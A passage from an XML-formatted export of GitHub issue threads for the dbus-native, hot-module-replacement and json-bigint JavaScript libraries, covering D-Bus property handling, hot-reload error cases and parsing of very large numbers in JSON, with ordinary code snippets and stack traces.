      <Body>That was what I was thinking. It seems like the only way to avoid breaking
too many things. I'm thinking that there should also be support for saying
"readwrite", even if that is the default, and redundant. e.g
`testproperty: ['y', 'readwrite']`.
I know that often I like to explicitly define things like this, even if
there is an implicit option. The code is more readable, and I and others
could understand it more easily when looking over it later
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'd prefer to keep it backwards compatible if possible and I'll leave 'signature' to be the same as ['signature', 'readwrite' ] though I agree with you

I'll try to make those changes over weekend ( feel free to look at the code and try to change it as well )
</Body>
    </Comment>
    <Comment>
      <Owner>WhiteAbeLincoln</Owner>
      <Body>Sure I agree with that. I'm just saying that the default will still be readwrite, but you can also explicitly say that, using the new format. Everything would stay backwards compatible, you just have two ways of  saying readwrite, one explicit, one implicit.

e.g
`testproperty: 'y'    //still works, is readwrite`
and
`testproperty: ['y', 'readwrite']     //functionally the same, just more verbose`
</Body>
    </Comment>
  </Issue_418>
  <Issue_419>
    <Repository>dbus-native</Repository>
    <Title>Service: How do I emit a org.freedesktop.DBus.Properties.PropertiesChanged signal?</Title>
    <Owner>sidorares</Owner>
    <Body>When running a service, can I emit an org.freedesktop.DBus.Properties.PropertiesChanged signal for a property of my object?  If so, how? I tried something along the lines of:
`myObject.emit('org.freedesktop.DBus.Properties.PropertiesChanged','my.interface.name', {MyProperty: newValue});`
but that didn't work.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I can't see existing helper in object itself ( feel free to add it ), but on low level signals are just messages with type=signal. Use `bus.sendSignal` for that - https://github.com/sidorares/node-dbus/blob/master/lib/bus.js#L56
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>at the moment it's only implemented on a service side - if your interface implementation object has "emit" function, calling it result in emitting dbus signal (in addition to node event, if your handler is EventEmitter ) - https://github.com/sidorares/node-dbus/blob/master/lib/bus.js#L205-L234
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>oh, that's actually for service, sorry ( I thought you have a client )

Note that your signal must be declared in your interface - https://github.com/sidorares/node-dbus/blob/master/lib/bus.js#L213
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Can you reduce your service to something with no dependencies - I'll try to run locally and check if signal is send with dbus-monitor or wireshark
</Body>
    </Comment>
    <Comment>
      <Owner>cybex-jmclaughlin</Owner>
      <Body>I need to change focus temporarily, but I will get back to this in a few.
</Body>
    </Comment>
    <Comment>
      <Owner>acrisci</Owner>
      <Body>I'm having this problem now. I can't figure out a way to emit `PropertiesChanged` on the `org.freedesktop.DBus.Properties` interface for my service.</Body>
    </Comment>
  </Issue_419>
  <Issue_420>
    <Repository>dbus-native</Repository>
    <Title>assignment in if statments in bus.js</Title>
    <Owner>sidorares</Owner>
    <Body>Running the code through jslint and found assignement in if statements.

Just want to check to see if that's what you intended.

https://github.com/sidorares/node-dbus/blob/master/lib/bus.js#L123

https://github.com/sidorares/node-dbus/blob/master/lib/bus.js#L128
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I think it's intended but I'd rewrite it to be more clean
</Body>
    </Comment>
  </Issue_420>
  <Issue_421>
    <Repository>dbus-native</Repository>
    <Title>Get properties in a dict</Title>
    <Owner>sidorares</Owner>
    <Body>Hi,
When I get a dict,how do I get value in it?
Like in this picture,
how can I get value of Interface or Udi?
![2015-04-01 16 14 35](https://cloud.githubusercontent.com/assets/7447937/6936980/6e5c1356-d88a-11e4-8b86-c0c5969b8cd6.png)
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>which value exactly?
`a{sv}` is serialised as js array where each element is `sv` entry, which is 2 element array - s + v.
v is serialised as array [parsed signature, value]
</Body>
    </Comment>
    <Comment>
      <Owner>zhangtianye</Owner>
      <Body>The dict can like this : [["Udi",[["type":"s","child":[]}],["/sys/devices/pci:0000:00/0000:00:c1.0/0000:02:00.0/net/wlan0"]]],how can I get the value "/sys/devices/pci:0000:00/0000:00:c1.0/0000:02:00.0/net/wlan0" ?
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>dict[1][1][0] ?

```
&gt; d = [["Udi",[[{"type":"s","child":[]}],["/sys/devices/pci:0000:00/0000:00:c1.0/0000:02:00.0/net/wlan0"]]]]
[[ 'Udi',
  [ [ [Object] ],
    [ '/sys/devices/pci:0000:00/0000:00:c1.0/0000:02:00.0/net/wlan0' ] ] ] ]
&gt; d[0][1][1][0]
'/sys/devices/pci:0000:00/0000:00:c1.0/0000:02:00.0/net/wlan0'
```

first 0 - "first key-value pair"
1 - value of the pair ( which is a variant )
1 - value of variant
0 - first element of "s" structure ( structure with one single element, a string )
</Body>
    </Comment>
    <Comment>
      <Owner>zhangtianye</Owner>
      <Body>Oh,And if I get a dict like:[["Udi",[["type":"s","child":[]}],["/sys/devices/pci:0000:00/0000:00:c1.0/0000:02:00.0/net/wlan0"]]]  
What can I do if I want to change it to the dict like it:
[["Udi", 
      ["s",["/sys/devices/pci:0000:00/0000:00:c1.0/0000:02:00.0/net/wlan0"]]]]
Because I can't use the dict directly in some way .
Thanks!
</Body>
    </Comment>
  </Issue_421>
  <Issue_422>
    <Repository>dbus-native</Repository>
    <Title>Improved format of incoming DBus messages</Title>
    <Owner>sidorares</Owner>
    <Body>### Changes
- Cleaned up unit tests
- Cleaned up some of the code: indentation, formatting, etc
- Improved message unmarshaling
  - variants are returned directly, without being wrapped in 2 arrays
  - booleans are returned as true/false - not 1/0 values.
  - arrays of dictionary entries are returned as JS Objects
### Testing
- Added unit tests for my changes. All tests pass.
- Tested interaction with some DBus services: Connman and Ofono.
### Notes

My commits introduce a lot of white space changes (consistent indentation and removal of trailing white space). I hope it is not a problem...
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I wonder if there are users who might suffer from "Unmarshal Array of DictEntry as JS Object" ( which is good, but not backwards compatible ). Overall - LGTM, thanks for your efforts.
I'll see how it would be difficult to port node-dbusmenu to support this version before merging
</Body>
    </Comment>
    <Comment>
      <Owner>gkubisa</Owner>
      <Body>I suppose the change is worth breaking backwards compatibility. The existing users can always use an older version of the module before they are ready to migrate. On the other hand, the new users will not be put off by the deeply nested arrays which are difficult to work with.
</Body>
    </Comment>
    <Comment>
      <Owner>jrobeson</Owner>
      <Body>whatever happened to this? seems useful.
</Body>
    </Comment>
    <Comment>
      <Owner>jrobeson</Owner>
      <Body>I'd still like to see this, but the codebase has changed so massively that I can't figure out what changed go where anymore.</Body>
    </Comment>
  </Issue_422>
  <Issue_423>
    <Repository>dbus-native</Repository>
    <Title>problem if call bus.connection.end(); too early</Title>
    <Owner>sidorares</Owner>
    <Body>if i create sessionBus start use it and without delay call bus.connection.end();
i have errors like

```
 Uncaught Error: read ECONNRESET
  at errnoException (net.js:901:11)
  at Pipe.onread (net.js:556:19)

 Uncaught Error: read ECONNRESET
  at errnoException (net.js:901:11)
  at Pipe.onread (net.js:556:19)
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Thanks, I can reproduce it. I'll probably rewrite end() so it'll close stream gracefully after all pending messages are sent (in this case hanshake message sent to closed stream)
</Body>
    </Comment>
    <Comment>
      <Owner>pimterry</Owner>
      <Body>This still happens, which is causing me problems. Are there plans to fix this?</Body>
    </Comment>
  </Issue_423>
  <Issue_424>
    <Repository>dbus-native</Repository>
    <Title>Dict of string, variant -&gt; hash map</Title>
    <Owner>sidorares</Owner>
    <Body>The dbus type a{sv} (array of string -&gt; variant pairs) is considered a dictionary, so it usually gets translated to a JS object by DBus clients.
In this Dbus implementation, it remains an array of pairs (also arrays).
</Body>
    <State>open</State>
    <Comment>
      <Owner>Ivshti</Owner>
      <Body>A simple patch to hack the problem (apply to **message.js**):
(this is only a guideline, I guess there is a better place to put this code in)

``` diff
14c14
&lt;  
---
&gt; 
59c59,75
&lt;                 message.body = data;
---
&gt;                 
&gt;                 if (message.signature == "a{sv}") /* Hash map, a special case */
&gt;                 {
&gt;                   var map = {};
&gt;                   data[0].forEach(function(pair)
&gt;                   {
&gt;                       var value = pair[1][1][0];
&gt;                       if (! isNaN(value))
&gt;                           value = parseInt(value);
&gt;                       map[pair[0]] = value; 
&gt;                   });
&gt;                   
&gt;                   message.body = [map];
&gt;               }
&gt;               else
&gt;                   message.body = data;
&gt;                   
78a95
&gt; 
```
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thanks, I was thinking about this. Some thoughts:
- it has to be on lower level in unmarshall ( e.i handle not only "a{sv}" but also at any level "aa(sa{sv})" and not only variants - a{ss}, a{si} -&gt; { "strkey": "strval" }, {"strkey" -&gt; intVal }. Note that dict entry type {} as just a pair of values, and a{ss} is array of pairs, not necessary a hash (there is no guarantee that keys are unique and assuming they are we might lose some values). 
</Body>
    </Comment>
    <Comment>
      <Owner>Ivshti</Owner>
      <Body>"A DICT_ENTRY works exactly like a struct, but rather than parentheses it uses curly braces, and it has more restrictions. The restrictions are: it occurs only as an array element type; it has exactly two single complete types inside the curly braces; the first single complete type (the "key") must be a basic type rather than a container type. Implementations must not accept dict entries outside of arrays, must not accept dict entries with zero, one, or more than two fields, and must not accept dict entries with non-basic-typed keys. A dict entry is always a key-value pair.

The first field in the DICT_ENTRY is always the key. A message is considered corrupt if the same key occurs twice in the same array of DICT_ENTRY. However, for performance reasons implementations are not required to reject dicts with duplicate keys.

In most languages, an array of dict entry would be represented as a map, hash table, or dict object."

Basically an a{s*} where \* is a basic type is a hash. And yes, it must be accepted at any level, that did not occur to me.
</Body>
    </Comment>
  </Issue_424>
  <Issue_425>
    <Repository>hot-module-replacement</Repository>
    <Title>Once an error occurs, file can't be updated</Title>
    <Owner>sidorares</Owner>
    <Body>I was able to replicate via:&#13;
&#13;
1. `module.hot.accept` a file that can be successfully `require`d.&#13;
2. Make changes to the file (confirmed updated).&#13;
3. Add `require('lodash')` or any other dependency that doesn't exist.&#13;
4. Error occurs here:&#13;
https://github.com/sidorares/hot-module-replacement/blob/2af226b9e8fd1ce75b40b96c0920f053e92db450/index.js#L115&#13;
5. Subsequent changes to the file aren't reloaded.&#13;
&#13;
```&#13;
&#128640; Ready! http://localhost:3000/&#13;
&#128257;  Hot-reloaded /private/tmp/test/routes/index.js&#13;
{ Error: Cannot find module 'lodash'&#13;
    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:580:15)&#13;
    at Function.Module._load (/Users/eric/Projects/ericclemmons/polydev/node_modules/hot-module-replacement/index.js:115:32)&#13;
    at Module.require (internal/modules/cjs/loader.js:636:17)&#13;
    at require (internal/modules/cjs/helpers.js:20:18)&#13;
    at Object.&lt;anonymous&gt; (/private/tmp/test/routes/index.js:1:86)&#13;
    at Module._compile (internal/modules/cjs/loader.js:688:30)&#13;
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:699:10)&#13;
    at Object._extensions.(anonymous function) [as .js] (/Users/eric/Projects/ericclemmons/polydev/node_modules/hot-module-replacement/index.js:15:33)&#13;
    at Module.load (internal/modules/cjs/loader.js:598:32)&#13;
    at Watcher.&lt;anonymous&gt; (/Users/eric/Projects/ericclemmons/polydev/node_modules/hot-module-replacement/index.js:90:23) code: 'MODULE_NOT_FOUND' }&#13;
Accepted /private/tmp/test/routes/index.js&#13;
Accepted /private/tmp/test/routes/index.js&#13;
Accepted /private/tmp/test/routes/index.js&#13;
```&#13;
&#13;
Not sure how, but I would expect that changes to a file that has been accepted would be watched for changes even if it can't successfully be `require`d.</Body>
    <State>open</State>
    <Comment>
      <Owner>ericclemmons</Owner>
      <Body>Hmmm, just went through replicating &amp; it looks like I may have some broken logic elsewhere.&#13;
&#13;
Sorry!</Body>
    </Comment>
    <Comment>
      <Owner>ericclemmons</Owner>
      <Body>Ok, so maybe the real question is **how can I perform an action when HMR fails**?&#13;
&#13;
`module.hot.accept` only fires when a module can be successfully replaced, but if there's an error &amp; I want to perform some cleanup or notification, there doesn't seem to be a hook.&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; Ok, so maybe the real question is how can I perform an action when HMR fails?&#13;
&#13;
not sure yet. To begin, I need to check what api webpack HMR follows&#13;
&#13;
There is self-accept handler that takes error callback ( https://webpack.js.org/api/hot-module-replacement/#accept-self ) Also `onErrored` in appy - https://webpack.js.org/api/hot-module-replacement/#apply&#13;
&#13;
If you have time maybe can you point me to some webpack HMR error screens integration examples and we'll figure out best way to handle errors from users code in this module</Body>
    </Comment>
    <Comment>
      <Owner>ericclemmons</Owner>
      <Body>Here's a sandbox showing the error I want to trap in `handler.js`:&#13;
https://codesandbox.io/s/k2nvx9n3x5&#13;
&#13;
</Body>
    </Comment>
  </Issue_425>
  <Issue_426>
    <Repository>hot-module-replacement</Repository>
    <Title>Error on start</Title>
    <Owner>sidorares</Owner>
    <Body>I got this inconsistent error on start the 3. time:&#13;
&#13;
```bash&#13;
node_modules\hot-module-replacement\index.js:24&#13;
    function pathsToAcceptingModules(path, root) {&#13;
                                    ^&#13;
&#13;
RangeError: Maximum call stack size exceeded&#13;
    at pathsToAcceptingModules (node_modules\hot-module-replacement\index.js:24:37)&#13;
    at pathsToAcceptingModules (node_modules\hot-module-replacement\index.js:42:9)&#13;
    at pathsToAcceptingModules (node_modules\hot-module-replacement\index.js:42:9)&#13;
    at pathsToAcceptingModules (node_modules\hot-module-replacement\index.js:42:9)&#13;
    at pathsToAcceptingModules (node_modules\hot-module-replacement\index.js:42:9)&#13;
    at pathsToAcceptingModules (node_modules\hot-module-replacement\index.js:42:9)&#13;
    at pathsToAcceptingModules (node_modules\hot-module-replacement\index.js:42:9)&#13;
    at pathsToAcceptingModules (node_modules\hot-module-replacement\index.js:42:9)&#13;
    at pathsToAcceptingModules (node_modules\hot-module-replacement\index.js:42:9)&#13;
    at pathsToAcceptingModules (node_modules\hot-module-replacement\index.js:42:9)&#13;
```&#13;
&#13;
I am getting this in a case as well where I am not actually using this library, but I am requiring it like this:&#13;
```JavaScript&#13;
require('hot-module-replacement')()&#13;
```&#13;
&#13;
Version: `3.0.2`&#13;
Operating system: `Windows`</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can you share modules themselves so I can reproduce locally? Cyclic dependency maybe?</Body>
    </Comment>
    <Comment>
      <Owner>kireerik</Owner>
      <Body>Yes, I have finished creating an example project: https://github.com/kireerik/refo/tree/master/example&#13;
&#13;
Documentation is coming soon.&#13;
&#13;
I didn't experienced this error with this example project yet. I also can not reproduce it in my other project.</Body>
    </Comment>
  </Issue_426>
  <Issue_427>
    <Repository>hot-module-replacement</Repository>
    <Title>Error when deleting module file</Title>
    <Owner>sidorares</Owner>
    <Body>I am getting the following error when deleting a module file:&#13;
```bash&#13;
{ Error: ENOENT: no such file or directory, open 'pathToModule.js'&#13;
     at Object.openSync (fs.js:450:3)&#13;
     at Object.readFileSync (fs.js:350:35)&#13;
     at Object.Module._extensions..js (internal/modules/cjs/loader.js:733:20)&#13;
     at Object._extensions.(anonymous function) [as .js] (node_modules\hot-module-replacement\index.js:15:33)&#13;
     at Module.load (internal/modules/cjs/loader.js:620:32)&#13;
     at Watcher.&lt;anonymous&gt; (node_modules\hot-module-replacement\index.js:90:23)&#13;
     at Watcher.emit (events.js:189:13)&#13;
     at callback (node_modules\node-watch\lib\watch.js:254:14)&#13;
     at node_modules\node-watch\lib\watch.js:112:10&#13;
     at Array.forEach (&lt;anonymous&gt;)&#13;
   errno: -4058,&#13;
   syscall: 'open',&#13;
   code: 'ENOENT',&#13;
   path:&#13;
    'pathToModule.js' }&#13;
```&#13;
There is no similar error when a module file is renamed.&#13;
&#13;
Version: `3.0.2`&#13;
Operating system: `Windows`</Body>
    <State>open</State>
    <Comment>
      <Owner>kireerik</Owner>
      <Body>The same error is emitted when deleting a sub module.&#13;
&#13;
In that case, I would probably except to get a warning like this instead:&#13;
```bash&#13;
(node:&lt;number&gt;) UnhandledPromiseRejectionWarning: Error: Cannot find module 'module'&#13;
     at Function.Module._resolveFilename (internal/modules/cjs/loader.js:603:15)&#13;
     at Function.Module._load (node_modules\hot-module-replacement\index.js:115:32)&#13;
     at Module.require (internal/modules/cjs/loader.js:659:17)&#13;
     at require (internal/modules/cjs/helpers.js:22:18)&#13;
     at Object.&lt;anonymous&gt; (mainModule.js:1:81)&#13;
     at Module._compile (internal/modules/cjs/loader.js:723:30)&#13;
     at Object.Module._extensions..js (internal/modules/cjs/loader.js:734:10)&#13;
     at Object._extensions.(anonymous function) [as .js] (node_modules\hot-module-replacement\index.js:15:33)&#13;
     at Module.load (internal/modules/cjs/loader.js:620:32)&#13;
     at tryModuleLoad (internal/modules/cjs/loader.js:560:12)&#13;
```&#13;
&#13;
Renaming a sub module also works, but in that case I would probably expect to get an error like the above as well.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>What do you think desired behaviour should be?&#13;
&#13;
The reason error is thrown is because it tries to re-load module in `watch()` handler</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; The same error is emitted when deleting a sub module.&#13;
&#13;
yes, when you mark a module as 'hot-reloadable' by accepting it it watches all dependencies of that module</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Need to investigate if webpack api has any way of handling errors. Currently "accept" handler is only notified when module can be loaded after it's updated ( and by the time handler is called module is already in the cache ). For example if you delete file, but then re-create it (with valid content) your handler will be called again for new file</Body>
    </Comment>
    <Comment>
      <Owner>kireerik</Owner>
      <Body>I think we could check the `eventType` and check if it's value is `'remove'` and if so then we don't try to reload that module, because it is no longer exists. So we don't get this error.&#13;
&#13;
https://github.com/sidorares/hot-module-replacement/blob/8fa1925acac17a10f53f6bfde510efc5c49d3da9/index.js#L70</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>not sure if it's a good idea or not. You skip updating the tree but it's now in the invalid state and changing any parent module of the one removed would still display similar message</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>API-wise we could try to wire `addStatusHandler` to allow consumers to react on various errors and transitions of a module to and from errored state&#13;
https://webpack.js.org/api/hot-module-replacement/#addstatushandler</Body>
    </Comment>
    <Comment>
      <Owner>kireerik</Owner>
      <Body>I agree with you that it is not necessarily a good idea. (In my use case if you delete a top module that is completely normal.)&#13;
&#13;
Currently changing any parent module of the one removed does not emits any warning, but I think it should as I mentioned it before. https://github.com/sidorares/hot-module-replacement/issues/8#issuecomment-445986246</Body>
    </Comment>
  </Issue_427>
  <Issue_428>
    <Repository>json-bigint</Repository>
    <Title>Native bigints support</Title>
    <Owner>sidorares</Owner>
    <Body>Possibly closes #29 &#13;
&#13;
Hope that documentation for new features is good enough, otherwise please tell me what do you want :)</Body>
    <State>open</State>
    <Comment>
      <Owner>nickkolok</Owner>
      <Body>Sorry for multiple force-pushes... The problem was that the original `v0.3.0` failed to build on Travis: https://travis-ci.org/nickkolok/json-bigint/builds/500765245&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>Almenon</Owner>
      <Body>This will come in handy for vscode extension developers once vscode upgrades to 10.4.0 (currently on 10.2.0).  Once that happens and this PR gets merged I can fix https://github.com/Almenon/AREPL-vscode/issues/219</Body>
    </Comment>
  </Issue_428>
  <Issue_429>
    <Repository>json-bigint</Repository>
    <Title>Why not use BigInt now native to node.js since v10.4.0?</Title>
    <Owner>sidorares</Owner>
    <Body>Since v8 added native [BigInt](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt) support and that has been available since node.js v10.4.0, why not use that instead of bignumber.js?&#13;
&#13;
Thanks for this package! Greate work!</Body>
    <State>open</State>
    <Comment>
      <Owner>huturen</Owner>
      <Body>@codyzu  it has the problems that JSON.stringify a BigInt value as of v10.4.0 &#13;
&#13;
```javascript&#13;
&gt; theBiggestInt = 9007199254740991n;&#13;
9007199254740991n&#13;
&#13;
&gt; JSON.stringify(theBiggestInt)&#13;
Thrown:&#13;
TypeError: Do not know how to serialize a BigInt&#13;
    at JSON.stringify (&lt;anonymous&gt;)&#13;
```</Body>
    </Comment>
  </Issue_429>
  <Issue_430>
    <Repository>json-bigint</Repository>
    <Title>Reduced memory usage when parsing many long string</Title>
    <Owner>sidorares</Owner>
    <Body>### Test code&#13;
```js&#13;
 #!/usr/bin/env node&#13;
&#13;
const BitcoinCore = require('bitcoin-core');&#13;
&#13;
let conn = new BitcoinCore({&#13;
 host: 'localhost',&#13;
 port: 8332,&#13;
 network: 'mainnet',&#13;
 username: 'bitcoin',&#13;
 password: 'bitcoin'&#13;
});&#13;
  &#13;
let blockNum = 558355; // example&#13;
&#13;
(async () =&gt; {&#13;
 let hash = await conn.getBlockHash(blockNum);&#13;
&#13;
 let prev = Date.now();&#13;
 let ret = await conn.getBlockByHash(hash, {&#13;
  extension: 'json'&#13;
 });&#13;
&#13;
 console.log(Date.now() - prev, process.memoryUsage().heapUsed);&#13;
})();&#13;
```&#13;
&#13;
I Tested on my laptap&#13;
&#13;
#### Before Output ( 5 times )&#13;
&#13;
```&#13;
1660 264063048&#13;
1694 264984656&#13;
1708 264312088&#13;
1681 264337120&#13;
1691 265233768&#13;
```&#13;
&#13;
#### After Output ( 5 times )&#13;
&#13;
Faster(even include same network time) and about 1/10 memory usage&#13;
```&#13;
1298 29823136&#13;
1325 29790656&#13;
1316 29875392&#13;
1344 29941656&#13;
1298 29785832&#13;
```&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>Jongsic</Owner>
      <Body>Checking failure seems not my fault.&#13;
&#13;
'debug' library has syntax that fail on testing. &#13;
&#13;
&#13;
In My laptap&#13;
&#13;
```&#13;
&gt; npm test &#13;
&#13;
  Testing bigint support&#13;
    &#10003; Should show classic JSON.parse lacks bigint support&#13;
    &#10003; Should show JSNbig does support bigint parse/stringify roundtrip&#13;
&#13;
  Testing 'strict' option&#13;
    &#10003; Should show that duplicate keys just get overwritten by default&#13;
    &#10003; Should show that the 'strict' option will fail-fast on duplicate keys&#13;
&#13;
  Testing 'storeAsString' option&#13;
    &#10003; Should show that the key is of type object&#13;
    &#10003; Should show that key is of type string, when storeAsString option is true&#13;
&#13;
&#13;
  6 passing (27ms)&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>nickkolok</Owner>
      <Body>@Jongsic , please consider cherry-picking https://github.com/sidorares/json-bigint/pull/30/commits/a6594d8ad0c0b6702914f9a46ddedb80b842bd39 and, optionally, 60f25be682432217aea1e4f6babf3c360d0b83a1 .&#13;
It should solve the problem with `debug` library</Body>
    </Comment>
  </Issue_430>
  <Issue_431>
    <Repository>json-bigint</Repository>
    <Title>#25 parse very big numeric values</Title>
    <Owner>sidorares</Owner>
    <Body>1. Exchanged `if (!isFinite(number))` by `if (!bigNumberValue.isFinite())` and had to move this function a few lines down in this context, but I think this check is not necessary at all, because whenever a numeric value will be entered, it must be finite anyway.&#13;
&#13;
2. Replaced `if (string.length &gt; 15)`  by `if (bigNumberValue.toFixed().length &gt; 15)` to ensure big numbers written in scientific notation will also be parsed to BigNumber objects.&#13;
&#13;
3. Added a test case for evaluating my changes.&#13;
&#13;
&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>SebastianG77</Owner>
      <Body>Hi,&#13;
&#13;
do you already have some feedback regarding this pull request? Will appreciate if you can merge my changes soon as I need this feature now.</Body>
    </Comment>
    <Comment>
      <Owner>SebastianG77</Owner>
      <Body>Hi,&#13;
&#13;
I just wanted to let you know that I published my fork at npm (https://www.npmjs.com/package/true-json-bigint) as I now really need these changes. Of course, I also referenced your project in the README.md. I hope you don't mind. If I find some time I maybe will keep on extending it by i.e. adding some more test cases etc. It still will be nice if you find some time to merge my pull request.&#13;
&#13;
</Body>
    </Comment>
  </Issue_431>
  <Issue_432>
    <Repository>json-bigint</Repository>
    <Title>Unable to parse values larger than 1.7976931348623157E+308</Title>
    <Owner>sidorares</Owner>
    <Body>Hi,&#13;
&#13;
when trying to parse a JSON-String which contains a very very big number, I get the following error message: "Bad number". The reason is, that you use isFinite() to check if the number is a finite one. However, according to the specification, Infinity is determined, as following: &#13;
&#13;
"Infinity is displayed when a number exceeds the upper limit of the floating point numbers, which is 1.797693134862315E+308."&#13;
&#13;
As a result, whenever a numeric value that will be parsed is larger than 1.797693134862315E+308, json-bigint is unable to parse the JSON file. &#13;
&#13;
Nevertheless, bignumber.js also has a function isFinite(), which is able to handle values larger than 1.797693134862315E+308. Since from my point of view, this module should be used to parse JSON-files containing any numeric value, I would appreciate if the currently used function isFinite() will be replaced by the function isFinite() of bignumber.js. Find the different results of these function in the following example:&#13;
&#13;
```javascript&#13;
const BigNumber = require('bignumber.js');&#13;
&#13;
console.log(isFinite(1.797693134862316E+308)) // false&#13;
&#13;
console.log(BigNumber('1.797693134862316E+308').isFinite()) //true&#13;
```&#13;
&#13;
I also added a small example, where you can see the value 3e+500 will not be parsed appropriately with json-bigint. However, when using the standard JSON parser, the value can be parsed, even though the returned value is of course incorrect.&#13;
&#13;
```javascript&#13;
var JSONbig = require('json-bigint')&#13;
&#13;
let veryBigDecimal = `3e+500`&#13;
&#13;
try {&#13;
    let jsonBigResult = JSONbig.parse(veryBigDecimal)&#13;
    console.log(`JSONbig result: ${jsonBigResult.toString()}`)&#13;
} catch (e) {&#13;
    console.log(`JSONbig error thrown: ${e.message}`)&#13;
}&#13;
&#13;
try {&#13;
    let jsonResult = JSON.parse(veryBigDecimal)&#13;
    console.log(`JSON result: ${jsonResult.toString()}`)&#13;
} catch (e) {&#13;
    console.log(`JSON error thrown: ${e.message}`)&#13;
}&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Hi @SebastianG77 , your suggestions seem good to me. Would you be able to volunteer to make this change and submit PR?</Body>
    </Comment>
    <Comment>
      <Owner>SebastianG77</Owner>
      <Body>Alright, I can fix it, but I am not sure whether I will be able to do it before next weekend. Will send you a pull request as soon as I finished.</Body>
    </Comment>
    <Comment>
      <Owner>Almenon</Owner>
      <Body>I also ran into this error :/</Body>
    </Comment>
    <Comment>
      <Owner>Almenon</Owner>
      <Body>but this error would dissapear with native bignumbers right? @nickkolok do you still get this error in your PR?</Body>
    </Comment>
    <Comment>
      <Owner>nickkolok</Owner>
      <Body>@Almenon I'm afraid no.&#13;
```&#13;
&gt; BigInt("1e+500");&#13;
Thrown:&#13;
SyntaxError: Cannot convert 1e+500 to a BigInt&#13;
```&#13;
&#13;
```&#13;
&gt; BigInt("1E+1");&#13;
Thrown:&#13;
SyntaxError: Cannot convert 1E+1 to a BigInt&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>nickkolok</Owner>
      <Body>@Almenon I believe that the appropriate solution is to pass any number-like string to a user-defined function and the deal with the stuff which the function returns.</Body>
    </Comment>
    <Comment>
      <Owner>SebastianG77</Owner>
      <Body>Hey guys,&#13;
&#13;
I am afraid I might lack of context regarding your discussion, but I also fixed this error in this PR: https://github.com/sidorares/json-bigint/pull/26 . I also published my changes to npm (https://www.npmjs.com/package/true-json-bigint) as I needed them at that time. Feel free to try them out and give some feedback. Let me know if your problems still appear while using this package.&#13;
</Body>
    </Comment>
  </Issue_432>
  <Issue_433>
    <Repository>json-bigint</Repository>
    <Title>Allow decimals to be used as hints for converting to floats</Title>
    <Owner>sidorares</Owner>
    <Body>Two new options for strategies for converting to floats.&#13;
&#13;
The problem I had was that a number like '1.234567890123456789' is longer than 15 characters and therefore was being converted to a BigNumber. In my case, I definitely want this left as a float and don't care about the loss of precision.&#13;
&#13;
To this end I created 2 options for parsing numbers as floats: `options.floatHints` and `options.strictFloatHints`. Both are documented in the updated readme. But long story short; the strict version always treats the presence of a decimal as an instruction to parse the number as a float. The loose version will only parse the number as a float if the mantissa is non-zero. If it is zeroable, then it is stripped, with the integer part then subject to the same logic that existed previously.&#13;
&#13;
Tested.&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>the PR looks ok, but I'm a bit worried about growing nimber of options like yours. Maybe we should move to much simple api, for example `toNumber()` callback that takes number-like string as an input and decides what to return - JS number, BigNumber or something else. If not present the behaviour is automatic ( BigNumber if not all integer digits can be preserved accurately )</Body>
    </Comment>
    <Comment>
      <Owner>diyijing</Owner>
      <Body>@sidorares why not merge this PR ?</Body>
    </Comment>
  </Issue_433>
  <Issue_434>
    <Repository>json-bigint</Repository>
    <Title>Make it easy to get JSON that can be re-used by code that is not aware of json-bigint (aka stringify big numbers)</Title>
    <Owner>sidorares</Owner>
    <Body>See the updated "test" why this is useful :)
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Not sure if you really need this in the package - if you need stringified ints instead of BigNumber's you can add reviver in your own code, it's just 3 lines function as you demonstrated.

My biggest concern is that you proposing to change JSON.parse api ( probably in backward compartible way, but still). Please convince me with real life examples :)

Also, if you really want to help with this project - could you make a proper test suite out of test.js ( preferably using mocha )

anyway, thanks for your suggestion and waiting for more discussion
</Body>
    </Comment>
    <Comment>
      <Owner>KeKs0r</Owner>
      <Body>@sidorares 
I actually have a use case where I need to sent a BigInt to an API. And somehow I can't construct it without this PR.

thats my test that only passes with @tkissing changes:

``` javascript
    describe('BigINt', {only:true},function(){
        it('is the same', function(done){
            var JSONbig = require('json-bigint');
            var BigNumber = require('bignumber.js');
            var input = '{"id":40564371973213694,"custom_id":"2"}';
            var parsed = JSONbig.parse(input);
            var output = JSONbig.stringify(parsed);
            expect(input).equal(output);

            var ownJSON = {
                id: new BigNumber("40564371973213694"),
                custom_id: "2"
            };
            var outOwn = JSONbig.stringify(ownJSON);
            expect(outOwn).equal(input);
            done();
        });
    });
```
</Body>
    </Comment>
  </Issue_434>
